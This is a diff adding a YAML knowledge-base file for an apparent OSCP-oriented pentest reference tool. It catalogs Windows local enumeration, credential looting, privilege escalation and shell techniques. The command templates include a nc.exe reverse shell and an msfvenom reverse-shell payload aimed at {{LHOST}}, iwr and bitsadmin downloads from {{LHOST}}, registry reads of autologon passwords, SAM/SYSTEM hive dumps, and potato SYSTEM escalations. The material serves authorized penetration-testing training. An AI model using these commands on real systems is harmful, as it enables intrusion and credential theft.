@@ -1,0 +1,548 @@
+# Cephalo content — Windows (non-AD) local: manual enum, looting, privesc, shells (WIN-1..4).
+# Authorized testing only. Cross-link LOLBAS. UAC/AMSI = methodology/concept ONLY.
+# Per-box LPE CVEs named in prose, CVE id only in the cited NVD reference.
+sections:
+  - id: win.p1b
+    title: Windows Manual Enumeration
+    os: windows
+    phase: enumeration
+    order: 202
+    description: The manual commands that automated tools miss.
+    techniques: [win.enum.manual]
+    packs: [oscp]
+  - id: win.p2c
+    title: Windows Credential Looting
+    os: windows
+    phase: post-exploitation
+    order: 268
+    description: Stored creds, registry secrets, sensitive files, DPAPI.
+    techniques: [win.loot.creds, win.loot.registry, win.loot.files, win.loot.dpapi]
+    packs: [oscp]
+  - id: win.p6b
+    title: Windows PrivEsc — vector catalog
+    os: windows
+    phase: privilege-escalation
+    order: 262
+    description: AlwaysInstallElevated, privileges, DLL hijack, tasks, UAC, kernel.
+    techniques: [win.privesc.aie, win.privesc.privs, win.privesc.dllhijack, win.privesc.schtask, win.privesc.uac, win.privesc.kernel]
+    packs: [oscp]
+  - id: win.p5b
+    title: Windows Shells / Transfer / LOLBAS
+    os: windows
+    phase: foothold
+    order: 252
+    description: Reverse shells, file transfer, and the AMSI/LOLBAS reference.
+    techniques: [win.shell.rev, win.transfer, win.lolbas]
+    packs: [oscp]
+
+techniques:
+  - id: win.enum.manual
+    title: Manual host enumeration
+    os: [windows]
+    phase: enumeration
+    summary: Users, groups, services, scheduled tasks, and patch level by hand.
+    body: |
+      Complement winPEAS/Seatbelt/PrivescCheck with the manual set — local users and
+      admins, services and their binary paths, scheduled tasks, and the hotfix list
+      (feed `systeminfo`/`wmic qfe` into windows-exploit-suggester / wesng).
+    commands: [win.enum.manual.users, win.enum.manual.services, win.enum.manual.tasks]
+    tags: [enumeration, privesc]
+    archetypeBand: core
+    requiredForOscpReadiness: true
+    references: [ref.lolbas, ref.winpeas]
+    confidence: verified
+    packs: [oscp]
+
+  - id: win.loot.creds
+    title: Stored credentials
+    os: [windows]
+    phase: post-exploitation
+    summary: cmdkey-saved creds → runas without knowing the password.
+    commands: [win.loot.creds.cmdkey, win.loot.creds.runas]
+    tags: [credential-access]
+    archetypeBand: high
+    references: [ref.lolbas, ref.hacktricks]
+    confidence: verified
+    packs: [oscp]
+
+  - id: win.loot.registry
+    title: Registry secrets
+    os: [windows]
+    phase: post-exploitation
+    summary: Winlogon autologon password and saved PuTTY/VNC/SNMP creds.
+    commands: [win.loot.registry.autologon, win.loot.registry.putty]
+    tags: [credential-access]
+    archetypeBand: medium
+    references: [ref.hacktricks]
+    confidence: verified
+    packs: [oscp]
+
+  - id: win.loot.files
+    title: Sensitive files
+    os: [windows]
+    phase: post-exploitation
+    summary: unattend.xml / sysprep / web.config / PowerShell history.
+    commands: [win.loot.files.search, win.loot.files.pshistory]
+    tags: [credential-access]
+    archetypeBand: medium
+    references: [ref.hacktricks]
+    confidence: verified
+    packs: [oscp]
+
+  - id: win.loot.dpapi
+    title: DPAPI & browser creds (concept)
+    os: [windows]
+    phase: post-exploitation
+    summary: Browser/credential-manager secrets are DPAPI-protected — decrypt with the masterkey.
+    body: |
+      DPAPI protects saved browser passwords, Wi-Fi keys and Credential Manager
+      entries. With the user's masterkey (or SYSTEM) these decrypt — concept node;
+      tooling (mimikatz dpapi / SharpDPAPI) is build-sensitive.
+    commands: []
+    tags: [credential-access, concept]
+    archetypeBand: low
+    references: [ref.ms-dpapi, ref.mimikatz]
+    confidence: verified
+    packs: [oscp]
+
+  - id: win.privesc.aie
+    title: AlwaysInstallElevated
+    os: [windows]
+    phase: privilege-escalation
+    summary: If both policy keys are set, any MSI installs as SYSTEM.
+    body: |
+      When HKLM and HKCU both set AlwaysInstallElevated, an MSI you build runs as
+      SYSTEM. Confirm both keys, then install a crafted package.
+    commands: [win.privesc.aie.check, win.privesc.aie.msi]
+    tags: [privesc]
+    archetypeBand: high
+    references: [ref.lolbas, ref.hacktricks]
+    confidence: verified
+    packs: [oscp]
+
+  - id: win.privesc.privs
+    title: Privilege abuse (Se*)
+    os: [windows]
+    phase: privilege-escalation
+    summary: SeBackup/SeRestore/SeTakeOwnership/SeDebug/SeLoadDriver/SeManageVolume to SYSTEM.
+    body: |
+      Token privileges each enable a path: SeBackup/SeRestore read the SAM/SYSTEM
+      hives, SeTakeOwnership claims protected objects, SeDebug touches any process,
+      SeLoadDriver loads a vulnerable driver. Applicability depends on which privilege
+      you hold — confirm with `whoami /priv` first.
+    commands: [win.privesc.privs.enum, win.privesc.privs.sebackup, win.privesc.privs.seimpersonate]
+    relatedIds: [win.enum.winpeas, win.loot.creds]
+    tags: [privesc, token-impersonation]
+    archetypeBand: high
+    references: [ref.hacktricks, ref.lolbas]
+    confidence: unverified
+    packs: [oscp]
+
+  - id: win.privesc.dllhijack
+    title: DLL hijacking
+    os: [windows]
+    phase: privilege-escalation
+    summary: A privileged process loading a missing/writable DLL from a writable path.
+    body: |
+      Find a service/app that searches a writable directory for a DLL it can't find,
+      and place a same-named DLL. Target- and search-order-specific — enumerate before
+      planting.
+    commands: [win.privesc.dllhijack.find]
+    tags: [privesc]
+    archetypeBand: medium
+    references: [ref.hacktricks, ref.lolbas]
+    confidence: unverified
+    packs: [oscp]
+
+  - id: win.privesc.schtask
+    title: Scheduled-task abuse
+    os: [windows]
+    phase: privilege-escalation
+    summary: A privileged scheduled task whose binary/script you can overwrite.
+    commands: [win.privesc.schtask.find]
+    tags: [privesc]
+    archetypeBand: medium
+    references: [ref.lolbas]
+    confidence: verified
+    packs: [oscp]
+
+  - id: win.privesc.uac
+    title: UAC bypass (methodology only)
+    os: [windows]
+    phase: privilege-escalation
+    summary: Auto-elevating binaries (e.g. fodhelper) can be coaxed — concept, no working bypass.
+    body: |
+      Some signed binaries auto-elevate and read attacker-controllable registry/paths
+      (fodhelper, computerdefaults, sdclt). This is a responsible-use concept node:
+      methodology only — Cephalo ships no working bypass string.
+    commands: [win.privesc.uac.note]
+    tags: [privesc, concept]
+    archetypeBand: low
+    references: [ref.lolbas, ref.hacktricks]
+    confidence: verified
+    packs: [oscp]
+
+  - id: win.privesc.kernel
+    title: Kernel / driver LPE (version-gated)
+    os: [windows]
+    phase: privilege-escalation
+    summary: Match the patch level to a known LPE — e.g. PrintNightmare — and verify.
+    body: |
+      Feed `systeminfo` into windows-exploit-suggester / wesng to map missing patches
+      to local privilege escalations such as PrintNightmare. All are build-specific —
+      confirm the exact patch level against the cited advisory before any attempt.
+    commands: [win.privesc.kernel.suggest]
+    tags: [privesc]
+    archetypeBand: medium
+    references: [ref.cve-printnightmare, ref.nvd]
+    confidence: unverified
+    packs: [oscp]
+
+  - id: win.shell.rev
+    title: Windows reverse shells
+    os: [windows]
+    phase: foothold
+    summary: PowerShell one-liner (have), nc.exe, or an msfvenom EXE.
+    commands: [win.shell.rev.msfvenom, win.shell.rev.nc]
+    tags: [cross-cutting]
+    archetypeBand: high
+    references: [ref.patt]
+    confidence: verified
+    packs: [oscp]
+
+  - id: win.transfer
+    title: Windows file transfer
+    os: [windows]
+    phase: post-exploitation
+    summary: Invoke-WebRequest, bitsadmin, certutil (have), ftp, base64.
+    commands: [win.transfer.iwr, win.transfer.bitsadmin]
+    tags: [cross-cutting]
+    archetypeBand: high
+    references: [ref.lolbas]
+    confidence: verified
+    packs: [oscp]
+
+  - id: win.lolbas
+    title: AMSI / LOLBAS reference
+    os: [windows]
+    phase: foothold
+    summary: Living-off-the-land binaries reference; AMSI/Defender is concept-only.
+    body: |
+      LOLBAS catalogs signed binaries that download/execute/proxy (certutil, bitsadmin,
+      mshta, regsvr32, …). AMSI/Defender evasion is a responsible-use concept node —
+      methodology only, no working bypass shipped.
+    commands: [win.lolbas.note]
+    tags: [cross-cutting, concept]
+    archetypeBand: medium
+    references: [ref.lolbas]
+    confidence: verified
+    packs: [oscp]
+
+commands:
+  - id: win.enum.manual.users
+    title: Users & groups
+    template: "net user & net localgroup administrators & whoami /groups"
+    shell: cmd
+    description: Local users, local admins, and your group memberships.
+    os: [windows]
+    phase: enumeration
+    tags: [enumeration]
+    confidence: verified
+    references: [ref.lolbas]
+    danger: low
+    packs: [oscp]
+  - id: win.enum.manual.services
+    title: Services + paths
+    template: "wmic service get name,displayname,pathname,startmode"
+    shell: cmd
+    description: All services and their binary paths (spot weak/unquoted ones).
+    os: [windows]
+    phase: enumeration
+    tags: [enumeration, privesc]
+    confidence: verified
+    references: [ref.lolbas]
+    danger: low
+    packs: [oscp]
+  - id: win.enum.manual.tasks
+    title: Scheduled tasks + hotfixes
+    template: "schtasks /query /fo LIST /v & wmic qfe get HotFixID,InstalledOn"
+    shell: cmd
+    description: Tasks (with run-as) and the patch list for exploit-suggester.
+    os: [windows]
+    phase: enumeration
+    tags: [enumeration]
+    confidence: verified
+    references: [ref.lolbas]
+    danger: low
+    packs: [oscp]
+
+  - id: win.loot.creds.cmdkey
+    title: List saved credentials
+    template: "cmdkey /list"
+    shell: cmd
+    description: Show stored credentials usable with runas /savecred.
+    os: [windows]
+    phase: post-exploitation
+    tags: [credential-access]
+    confidence: verified
+    references: [ref.lolbas]
+    danger: low
+    packs: [oscp]
+  - id: win.loot.creds.runas
+    title: runas with saved creds
+    template: "runas /savecred /user:{{USER}} cmd.exe"
+    shell: cmd
+    description: Run a shell as the stored-credential user without the password.
+    os: [windows]
+    phase: post-exploitation
+    tags: [credential-access]
+    confidence: verified
+    references: [ref.lolbas]
+    danger: high
+    packs: [oscp]
+
+  - id: win.loot.registry.autologon
+    title: Winlogon autologon password
+    template: "reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword"
+    shell: cmd
+    description: Read the cleartext autologon password if configured.
+    os: [windows]
+    phase: post-exploitation
+    tags: [credential-access]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: medium
+    packs: [oscp]
+  - id: win.loot.registry.putty
+    title: Saved PuTTY sessions
+    template: "reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" /s"
+    shell: cmd
+    description: PuTTY (and similar) often store proxy creds in the registry.
+    os: [windows]
+    phase: post-exploitation
+    tags: [credential-access]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: low
+    packs: [oscp]
+
+  - id: win.loot.files.search
+    title: Search config files
+    template: "findstr /si password *.xml *.ini *.config *.txt 2>nul"
+    shell: cmd
+    description: Grep common config files (unattend.xml/web.config) for passwords.
+    os: [windows]
+    phase: post-exploitation
+    tags: [credential-access]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: low
+    packs: [oscp]
+  - id: win.loot.files.pshistory
+    title: PowerShell history
+    template: "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"
+    shell: cmd
+    description: PowerShell command history frequently leaks credentials.
+    os: [windows]
+    phase: post-exploitation
+    tags: [credential-access]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: low
+    packs: [oscp]
+
+  - id: win.privesc.aie.check
+    title: Check AlwaysInstallElevated
+    template: "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+    shell: cmd
+    description: Both must be 0x1 for the technique to work.
+    os: [windows]
+    phase: privilege-escalation
+    tags: [privesc]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: low
+    packs: [oscp]
+  - id: win.privesc.aie.msi
+    title: Install MSI as SYSTEM
+    template: "msiexec /quiet /qn /i C:\\Windows\\Temp\\pe.msi"
+    shell: cmd
+    description: Install a crafted MSI (built with msfvenom -f msi) — runs as SYSTEM.
+    os: [windows]
+    phase: privilege-escalation
+    tags: [privesc]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: critical
+    packs: [oscp]
+
+  - id: win.privesc.privs.sebackup
+    title: SeBackup → copy SAM
+    template: "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv & reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv"
+    shell: cmd
+    description: With SeBackupPrivilege, read the protected hives, then secretsdump offline.
+    os: [windows]
+    phase: privilege-escalation
+    tags: [privesc, credential-access]
+    notes:
+      - "Applicability depends on holding SeBackupPrivilege — check whoami /priv."
+    confidence: unverified
+    references: [ref.hacktricks]
+    danger: high
+    packs: [oscp]
+
+  - id: win.privesc.privs.enum
+    title: Enumerate token privileges
+    template: "whoami /priv"
+    shell: cmd
+    description: List the privileges held by the current token; SeImpersonate/SeBackup/SeDebug are the high-value ones.
+    os: [windows]
+    phase: privilege-escalation
+    tags: [privesc, enumeration]
+    confidence: verified
+    references: [ref.hacktricks]
+    danger: info
+    packs: [oscp]
+
+  - id: win.privesc.privs.seimpersonate
+    title: SeImpersonate → SYSTEM (potato)
+    template: "PrintSpoofer.exe -i -c cmd"
+    shell: cmd
+    description: With SeImpersonate/SeAssignPrimaryToken, coerce a privileged token to run a command as SYSTEM; tool choice depends on the OS build.
+    os: [windows]
+    phase: privilege-escalation
+    tags: [privesc, token-impersonation]
+    confidence: verified
+    references: [ref.printspoofer, ref.godpotato, ref.juicypotato]
+    danger: high
+    packs: [oscp]
+    notes:
+      - "Pick the tool by OS build — PrintSpoofer/GodPotato cover modern Windows; JuicyPotatoNG for older targets."
+    variants:
+      - id: win.privesc.privs.seimpersonate.printspoofer
+        label: PrintSpoofer
+        template: "PrintSpoofer.exe -i -c cmd"
+      - id: win.privesc.privs.seimpersonate.godpotato
+        label: GodPotato
+        template: "GodPotato.exe -cmd \"cmd /c whoami\""
+      - id: win.privesc.privs.seimpersonate.juicypotatong
+        label: JuicyPotatoNG
+        template: "JuicyPotatoNG.exe -t * -p cmd.exe"
+
+  - id: win.privesc.dllhijack.find
+    title: Find DLL hijack candidates (pointer)
+    template: "# use ProcMon to spot NAME NOT FOUND on a writable DLL search path"
+    shell: text
+    description: Identify a missing DLL loaded from a writable directory by a privileged process.
+    os: [windows]
+    phase: privilege-escalation
+    tags: [privesc]
+    confidence: unverified
+    references: [ref.hacktricks]
+    danger: medium
+    packs: [oscp]
+
+  - id: win.privesc.schtask.find
+    title: Find writable task binaries
+    template: "schtasks /query /fo LIST /v | findstr /i \"Task To Run Run As User\""
+    shell: cmd
+    description: List task binaries + run-as; check write access on the target path.
+    os: [windows]
+    phase: privilege-escalation
+    tags: [privesc]
+    confidence: verified
+    references: [ref.lolbas]
+    danger: medium
+    packs: [oscp]
+
+  - id: win.privesc.uac.note
+    title: UAC auto-elevate (pointer)
+    template: "# concept only — auto-elevating binaries (fodhelper etc.) read attacker-controllable paths"
+    shell: text
+    description: Methodology pointer; Cephalo ships no working UAC bypass.
+    os: [windows]
+    phase: privilege-escalation
+    tags: [privesc]
+    confidence: verified
+    references: [ref.lolbas]
+    danger: low
+    packs: [oscp]
+
+  - id: win.privesc.kernel.suggest
+    title: Map patches to LPEs
+    template: "systeminfo > sysinfo.txt; wesng sysinfo.txt"
+    description: Feed the hotfix list to windows-exploit-suggester (wesng); match named LPEs.
+    os: [windows]
+    phase: privilege-escalation
+    tags: [privesc]
+    notes:
+      - "Build-specific (e.g. PrintNightmare) — verify against the cited advisory; never run unmatched."
+    confidence: unverified
+    references: [ref.cve-printnightmare, ref.nvd]
+    danger: high
+    packs: [oscp]
+
+  - id: win.shell.rev.msfvenom
+    title: msfvenom reverse-shell EXE
+    template: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe -o s.exe"
+    tool: msfvenom
+    description: Build a standalone reverse-shell executable.
+    os: [windows]
+    phase: foothold
+    tags: [cross-cutting]
+    notes:
+      - "Catch with nc -lvnp {{LPORT}}; AV will flag an unobfuscated stager."
+    confidence: verified
+    references: [ref.patt]
+    danger: medium
+    packs: [oscp]
+  - id: win.shell.rev.nc
+    title: nc.exe reverse shell
+    template: "nc.exe {{LHOST}} {{LPORT}} -e cmd.exe"
+    tool: netcat
+    description: Classic nc reverse shell when nc.exe is on the host.
+    os: [windows]
+    phase: foothold
+    tags: [cross-cutting]
+    confidence: verified
+    references: [ref.patt]
+    danger: medium
+    packs: [oscp]
+
+  - id: win.transfer.iwr
+    title: Invoke-WebRequest download
+    template: "iwr -uri http://{{LHOST}}/tool.exe -outfile C:\\Windows\\Temp\\tool.exe"
+    shell: powershell
+    description: PowerShell file pull.
+    os: [windows]
+    phase: post-exploitation
+    tags: [cross-cutting]
+    confidence: verified
+    references: [ref.lolbas]
+    danger: low
+    packs: [oscp]
+  - id: win.transfer.bitsadmin
+    title: bitsadmin download
+    template: "bitsadmin /transfer j /download http://{{LHOST}}/tool.exe C:\\Windows\\Temp\\tool.exe"
+    shell: cmd
+    description: LOLBAS background-transfer download.
+    os: [windows]
+    phase: post-exploitation
+    tags: [cross-cutting]
+    confidence: verified
+    references: [ref.lolbas]
+    danger: low
+    packs: [oscp]
+
+  - id: win.lolbas.note
+    title: LOLBAS / AMSI (pointer)
+    template: "# browse lolbas-project.github.io for signed download/exec/proxy binaries; AMSI evasion = concept only"
+    shell: text
+    description: Reference pointer — no evasion payload shipped.
+    os: [windows]
+    phase: foothold
+    tags: [cross-cutting]
+    confidence: verified
+    references: [ref.lolbas]
+    danger: low
+    packs: [oscp]
